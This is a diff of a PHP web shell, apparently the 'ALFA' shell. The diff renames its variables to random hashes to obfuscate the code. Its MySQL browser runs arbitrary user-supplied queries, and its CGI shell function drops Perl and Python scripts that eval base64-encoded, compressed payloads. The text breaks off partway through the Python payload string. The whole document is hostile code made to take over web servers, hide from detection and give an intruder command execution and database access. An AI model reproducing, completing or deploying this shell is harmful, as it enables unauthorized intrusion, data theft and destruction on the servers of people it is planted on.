+			foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["data"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+				$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . ",";
+				$zedzftuyb2021c4149dfd5dc85c88823b7df34bd .= "'".mysqli_real_escape_string($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)."',";
 			}
-			$cols = substr($cols, 0, -1);
-			$vals = substr($vals, 0, -1);
-			$query = $query . "(" . $cols . ")" . "VALUES(" . $vals . ")";
-			$res = @mysqli_query($conn, $query);
-			echo @json_encode(array("status" => $res, "error" => @mysqli_error($conn)));
+			$pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 = substr($pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19, 0, -1);
+			$zedzftuyb2021c4149dfd5dc85c88823b7df34bd = substr($zedzftuyb2021c4149dfd5dc85c88823b7df34bd, 0, -1);
+			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = $ciexurcd1b1cc7f086b3f074da452bc3129981eb . "(" . $pwamkeco07d43db2a74336dcfbdaeeeffe6f7a19 . ")" . "VALUES(" . $zedzftuyb2021c4149dfd5dc85c88823b7df34bd . ")";
+			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+			echo @json_encode(array("status" => $ybaqpbzt9b207167e5381c47682c6b4f58a623fb, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898)));
 		}else{
-			$pages = 0;
-			$title = false;
-			$query = "";
-			$tbl_content = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
-			$line = 0;
-			$tables = array();
-			$columns = array();
-			if($type == "load_data"){
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT 0,30";
-				$tbl_count_q = @mysqli_query($conn, "SELECT COUNT(*) FROM `".$db["db"]."`.`".$db["table"]."`");
-				$tbl_count = @mysqli_fetch_row($tbl_count_q);
-				$columns_query = @mysqli_query($conn, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$db["db"]."' AND `TABLE_NAME` = '".$db["table"]."'");
-				while($row2 = @mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
-					$columns[] = $row2;
+			$qbxhislrb3b32a2d422265cd25c3323ed0157f81 = 0;
+			$ubqoiylnd5d3db1765287eef77d7927cc956f50a = false;
+			$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "";
+			$btudbolwbb6222905ef8419183b5437779497596 = '<table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+			$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = 0;
+			$lfhjdkwc9ab2ec7ea4a2041306f7bdf150fcd453 = array();
+			$aiidhoir54ca84a794888fe8d92834787dfa935a = array();
+			if($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "load_data"){
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` LIMIT 0,30";
+				$giyhocxd788c8f500cc1bb898988079084ced1bc = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COUNT(*) FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."`");
+				$qswpaoms4c6506afca4799d1a83f0fcaed9d0161 = @mysqli_fetch_row($giyhocxd788c8f500cc1bb898988079084ced1bc);
+				$ylrerbsc7d923585d45eaf069fa072333facbbe1 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME as name, COLUMN_TYPE as type, COLLATION_NAME as collation, DATA_TYPE as data_type, CHARACTER_MAXIMUM_LENGTH as type_value FROM information_schema.columns WHERE `TABLE_SCHEMA` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."' AND `TABLE_NAME` = '".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."'");
+				while($rfymspstcb08a1efc05437dd1a1358f362b2ecb8 = @mysqli_fetch_array($ylrerbsc7d923585d45eaf069fa072333facbbe1, MYSQLI_ASSOC)){
+					$aiidhoir54ca84a794888fe8d92834787dfa935a[] = $rfymspstcb08a1efc05437dd1a1358f362b2ecb8;
 				}
-				if($tbl_count[0] > 30){
-					$pages = ceil($tbl_count[0] / 30);
+				if($qswpaoms4c6506afca4799d1a83f0fcaed9d0161[0] > 30){
+					$qbxhislrb3b32a2d422265cd25c3323ed0157f81 = ceil($qswpaoms4c6506afca4799d1a83f0fcaed9d0161[0] / 30);
 				}
-			}elseif($type == "query"){
-				$query = $db["query"];
-			}elseif($type == "page"){
-				$db["page"] = (int)$db["page"] - 1;
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` LIMIT ".($db["page"]*30).",30";
-			}elseif($type == "search"){
-				$search = "";
-				$search_noval = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
-				foreach($db["search"] as $col => $val){
-					$search_noval_r = in_array($val["opt"], $search_noval);
-					if(empty($val["value"]) && !$search_noval_r)continue;
-					if(strstr($val["opt"], "...") || $search_noval_r){
-						$val["opt"] = str_replace("...", $val["value"], $val["opt"]);
-						$search .= $col . " " . $val["opt"] . " AND ";
+			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "query"){
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = $dhkkpmvsd77d5e503ad1439f585ac494268b351b["query"];
+			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "page"){
+				$dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"] = (int)$dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"] - 1;
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` LIMIT ".($dhkkpmvsd77d5e503ad1439f585ac494268b351b["page"]*30).",30";
+			}elseif($hcgexxko599dcce2998a6b40b1e38e8c6006cb0a == "search"){
+				$khftbobz06a943c59f33a34bb5924aaf72cd2995 = "";
+				$yogevfcjd0c6566acbbf4d1d5ee7d9e7e07f8fd9 = array("= ''", "!= ''", "IS NULL", "IS NOT NULL");
+				foreach($dhkkpmvsd77d5e503ad1439f585ac494268b351b["search"] as $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+					$lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca = in_array($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"], $yogevfcjd0c6566acbbf4d1d5ee7d9e7e07f8fd9);
+					if(empty($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"]) && !$lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca)continue;
+					if(strstr($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"], "...") || $lrtwlwksc1d0fcd08d7e2e1b35d20364a77f79ca){
+						$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] = str_replace("...", $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"], $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"]);
+						$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . " " . $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] . " AND ";
 					}else{
-						$search .= $col . " " . $val["opt"] . " '".addslashes($val["value"])."' AND ";
+						$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= $hibqnbdud89e2ddb530bb8953b290ab0793aecb0 . " " . $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["opt"] . " '".addslashes($jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf["value"])."' AND ";
 					}
 				}
-				$search .= "1=1";
-				$query = "SELECT * FROM `".$db["db"]."`.`".$db["table"]."` WHERE " . $search;
+				$khftbobz06a943c59f33a34bb5924aaf72cd2995 .= "1=1";
+				$ciexurcd1b1cc7f086b3f074da452bc3129981eb = "SELECT * FROM `".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"]."`.`".$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"]."` WHERE " . $khftbobz06a943c59f33a34bb5924aaf72cd2995;
 			}
-			$q_tables = @mysqli_query($conn, $query);
-			if(!$q_tables){
-				echo @json_encode(array("status" => false, "error" => @mysqli_error($conn), "query" => $query));
+			$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, $ciexurcd1b1cc7f086b3f074da452bc3129981eb);
+			if(!$pgiuavwd8333ff77213fbb0deec756efcc0d6b4f){
+				echo @json_encode(array("status" => false, "error" => @mysqli_error($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898), "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
 				return false;
 			}
-			$col_key = @mysqli_query($conn, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($db["db"])."' AND TABLE_NAME = '".@addslashes($db["table"])."' AND COLUMN_KEY = 'PRI'");
-			if($col_key){
-				$col_key = @mysqli_fetch_row($col_key);
-				$col_key = $col_key[0];
-				if(!empty($col_key)){
-					$tbl_content = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$col_key.'" tbl_name="'.$db["table"].'" db_id="'.$db["db_id"].'" 	db_target="'.$db["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
+			$wylowyxn455297d99eac97629deac972ea5e60d6 = @mysqli_query($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898, "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '".@addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"])."' AND TABLE_NAME = '".@addslashes($dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"])."' AND COLUMN_KEY = 'PRI'");
+			if($wylowyxn455297d99eac97629deac972ea5e60d6){
+				$wylowyxn455297d99eac97629deac972ea5e60d6 = @mysqli_fetch_row($wylowyxn455297d99eac97629deac972ea5e60d6);
+				$wylowyxn455297d99eac97629deac972ea5e60d6 = $wylowyxn455297d99eac97629deac972ea5e60d6[0];
+				if(!empty($wylowyxn455297d99eac97629deac972ea5e60d6)){
+					$btudbolwbb6222905ef8419183b5437779497596 = '<div style="margin-bottom:5px;margin-top:5px;"><button col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" 	db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" onclick="alfaMysqlDeleteAllSelectedrows(this);return false;">Delete Selected Rows</button></div><table width="100%" cellspacing="1" cellpadding="2" class="main mysql-data-tbl" style="background-color:#292929">';
 				}
 			}else{
-				$col_key = false;
+				$wylowyxn455297d99eac97629deac972ea5e60d6 = false;
 			}
-			while($item = @mysqli_fetch_assoc($q_tables)){
-				if(!$title){
-					$tbl_content .= '<tr style="background-color:#305b8e;">';
-					if($col_key){
-						$tbl_content .= '<th style="width: 55px;text-align:center;"><input db_id="'.$db["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
+			while($geklwdir447b7147e84be512208dcc0995d67ebc = @mysqli_fetch_assoc($pgiuavwd8333ff77213fbb0deec756efcc0d6b4f)){
+				if(!$ubqoiylnd5d3db1765287eef77d7927cc956f50a){
+					$btudbolwbb6222905ef8419183b5437779497596 .= '<tr style="background-color:#305b8e;">';
+					if($wylowyxn455297d99eac97629deac972ea5e60d6){
+						$btudbolwbb6222905ef8419183b5437779497596 .= '<th style="width: 55px;text-align:center;"><input db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" onchange="alfaMysqlTblSelectAll(this);" type="checkbox"></th><th style="width: 55px;text-align:center;">Edit</th><th style="width: 55px;text-align:center;">Delete</th>';
 					}
-					foreach($item as $key => $value){
-						$tbl_content .= '<th>'.$key.'</th>';
+					foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+						$btudbolwbb6222905ef8419183b5437779497596 .= '<th>'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'</th>';
 					}
-					reset($item);
-					$title=true;
-					$tbl_content .= '</tr><tr>';
+					reset($geklwdir447b7147e84be512208dcc0995d67ebc);
+					$ubqoiylnd5d3db1765287eef77d7927cc956f50a=true;
+					$btudbolwbb6222905ef8419183b5437779497596 .= '</tr><tr>';
 				}
 
-				if($col_key){
-					$cacheMsg = '<td style="text-align:center;"><input row_id="'.$line.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$item[$col_key].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$db["db_id"].'" db_target="'.$db["db"].'" tbl_name="'.$db["table"].'" col_key="'.$col_key.'" key="'.$item[$col_key].'" row_id="'.$line.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
+				if($wylowyxn455297d99eac97629deac972ea5e60d6){
+					$heibofcfb57c7e31313f57e4d1fd215613b10159 = '<td style="text-align:center;"><input row_id="'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'" type="checkbox" name="tbl_rows_checkbox[]" value="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'"></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" key="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'" onclick="alfaMysqlEditRow(this, \'edit\');" style="color:#0acaa6;">Edit</a></td><td style="text-align:center;"><a class="db-opt-id" href="javascript:void(0);" db_id="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db_id"].'" db_target="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["db"].'" tbl_name="'.$dhkkpmvsd77d5e503ad1439f585ac494268b351b["table"].'" col_key="'.$wylowyxn455297d99eac97629deac972ea5e60d6.'" key="'.$geklwdir447b7147e84be512208dcc0995d67ebc[$wylowyxn455297d99eac97629deac972ea5e60d6].'" row_id="'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'" onclick="alfaMysqlEditRow(this, \'delete\');" style="color:#ff1e1e;">Delete</a></td>';
 				}
-				$tbl_content .= '<tr class="tbl_row tbl_row_l'.$line.'">'.$cacheMsg;
-				$line++;
-				foreach($item as $key => $value){
-					if($value == null){
-						$tbl_content .= '<td><i>null</i></td>';
+				$btudbolwbb6222905ef8419183b5437779497596 .= '<tr class="tbl_row tbl_row_l'.$yeshcnjz6438c669e0d0de98e6929c2cc0fac474.'">'.$heibofcfb57c7e31313f57e4d1fd215613b10159;
+				$yeshcnjz6438c669e0d0de98e6929c2cc0fac474++;
+				foreach($geklwdir447b7147e84be512208dcc0995d67ebc as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $rkptsoeg2063c1608d6e0baf80249c42e2be5804){
+					if($rkptsoeg2063c1608d6e0baf80249c42e2be5804 == null){
+						$btudbolwbb6222905ef8419183b5437779497596 .= '<td><i>null</i></td>';
 					}else{
-						$tbl_content .= '<td>'.nl2br(htmlspecialchars($value)).'</td>';
+						$btudbolwbb6222905ef8419183b5437779497596 .= '<td>'.nl2br(htmlspecialchars($rkptsoeg2063c1608d6e0baf80249c42e2be5804)).'</td>';
 				}
 				}
-				$tbl_content .= '</tr>';
+				$btudbolwbb6222905ef8419183b5437779497596 .= '</tr>';
 			}
-			$tbl_content .= '</table>';
-			if(!$title){
-				$tbl_content = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
+			$btudbolwbb6222905ef8419183b5437779497596 .= '</table>';
+			if(!$ubqoiylnd5d3db1765287eef77d7927cc956f50a){
+				$btudbolwbb6222905ef8419183b5437779497596 = "<div style='padding:5px;border:1px dashed;margin:10px;'>Table is empty...</div>";
 			}
-			echo @json_encode(array("status" => true, "table" => $tbl_content, "columns" => $columns, "pages" => $pages, "query" => $query));
+			echo @json_encode(array("status" => true, "table" => $btudbolwbb6222905ef8419183b5437779497596, "columns" => $aiidhoir54ca84a794888fe8d92834787dfa935a, "pages" => $qbxhislrb3b32a2d422265cd25c3323ed0157f81, "query" => $ciexurcd1b1cc7f086b3f074da452bc3129981eb));
 		}
-		@mysqli_close($conn);
+		@mysqli_close($nyztcxgh0c1d0e2ef91d68bdb15eff954448b898);
 	}
 }
 function alfaselfrm(){
@@ -5046,82 +5119,82 @@ echo '</p></center></div>';
 }
 function alfacgishell(){
 alfahead();
-$div = "";
+$sqznsikw38696558dc98494c08d951c052900a2a = "";
 alfaCreateParentFolder();
 @chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
 if(!in_array($_POST['alfa1'],array('perl','py'))){
-$div = "</div>";
+$sqznsikw38696558dc98494c08d951c052900a2a = "</div>";
 echo '<div class=header><center><p><div class="txtfont_header">| CGI Shell |</div></p><h3><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'perl\')">| Perl | </a><a class="rejectme" href="javascript:void(0)" onclick="runcgi(\'py\');">| Python | </a>';
 }
 if(isset($_POST['alfa1'])&&in_array($_POST['alfa1'],array('perl','py'))){
 @mkdir('cgialfa',0755);
 @chdir('cgialfa');
 alfacgihtaccess('cgi');
-$name = $_POST['alfa1'].'.alfa';
-$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("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")));';;
-$py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("eJylF9ty2zb22foKDLxbUqurFTvN6Na6Xqf1bNNmErcvtkcDEqCICQlwQdC26vF++54DkBLVaOO2a8/YBM79fmDNZto5knmhjSXxWtpo5v8NhWJRJsJuRzzGorCAVbCy7NSo5absA15fl/21sAjpR6wUr0/7lckyGXUSo3NiZS5IQ2FNgueGgzUsFhGLP3nUj9ZItb76uUFvzjWjBrkBFwC1K1CtIxOiS9D2XhqthikrV5/EJqQfLz5cvb9e/XT+7pJ2QfkyNrKwioFCixbBzR7iXUdkpfg9NqUdLhLCsoRd5DyMkd1RnMqMr0rLpeqT7UFX1rMvdCHUBHD3UYdxpkt06tGREWWVIXabeGgE4+EeEd62qWxlFPHEnUSbHDms5fCtFBn/aLVha8SMcw4AhA8hPvcsq0QYxEG3w6X5HMABAH4EIjDNk/owDiv170pbEfrgDqPXp1zEmosQsLqOCBgCkWf7EhFgdVuS/MfNePrqjiwWJIg5CdC3yqvgzqSHEuBvMMNvhOB38cADwLyojBHK/tNJbwKE5F3wZJFB0oTBrQr6gTdQaeu4MQWcd7SBA0hFMh2zrAwxwAc5Byj2AOs6a0DCC1z32YIqHYjdyjsPs4bZdMiiEv+HdEi7nfeQ/QVmSXBD5nCvoI42mVjQWGfaTI/Hr74+GY9ndBn06jrEsFalMGG3F8xHSLL89gXKvXK4/PDr5Ye6HLYcDsqeRIk4OXMcdmbtSO7+FqDPVysso9XKRXi1yplUqxWG2ZUwoRdaWSAd2E0hpsSKRztKbZ7dmltFG6RgjlfLeQrVsZxbaTOxvICE4iTakPMf356Ta3H+jgzIxfdX5P3GplrNRx5tngvLoMaYKYVd0F+u3w7e0OXcWbL8xxNUVyaVmCqtxOz5eLVKUNuqeEoyzeyUGLlO7UzfCwMXD1OSSs6FmnkPkOPJWZKAEx8kt+mUnJyOi8cZlyWkx2YKoUfWgwji/2mGhg12fAQUSlHKcvaQSisG4LEYrFf6wbBi9pyxSGRPOTNrqQZOBWCOvIHeSsimAcvkWk1JDupkYhZpwwXoc1I8klJnkkOD4DPsl2ujK8Wn2EAVCMEgAfbjoEwZRz3G8HsKVMfjy1fj0/Oa08AwLqtyiqDGuMkZKvBnzIgrU6KXCg0xFOZ/OMYbi+NBq/VTW2e0oQ5DJhK79bLzxLNURWVvMGsWZRXl0t491QIbeW1eLr6H3VTHEjqnWotDDng+hoby9Je4Nb77GlU+EM8D0grGYVCsB7WTSssMYJ99DhGoCd4/Y1AgtOwJxoL8TdT67aV2S/uW8o3gli5te47fup9G8PTkNaDVxX/2Jj47e1MbCI3k77siYZXVs2doA67G5iNftZHmG6IVxJMvKNdxlUMuYrO6zAR+fre54uFtAK6+hRabAAK0zBkl0dpJXNDjsfuhxOrCu3JB4YSp0Tr6T6dW65wKdLq7QGcBM28adIJYYLIs5wn0IVKLgkDSJTTcaNdlwCOClIyTryB972UpYTki/3HX9enbNfS2bBjrfD6KoP3NR8gS7G8kWFyoiHfzgp5QUmuJ3qMkhlrC+gFHOz3xXDt+QSegqEUW/IA/2mxqOxKowwX9VRjOFKMEs8IzAcX2LD2eTC4nkzcO8nFnC7lYy20jjZa1KQR6tRKxBY9YTV6Y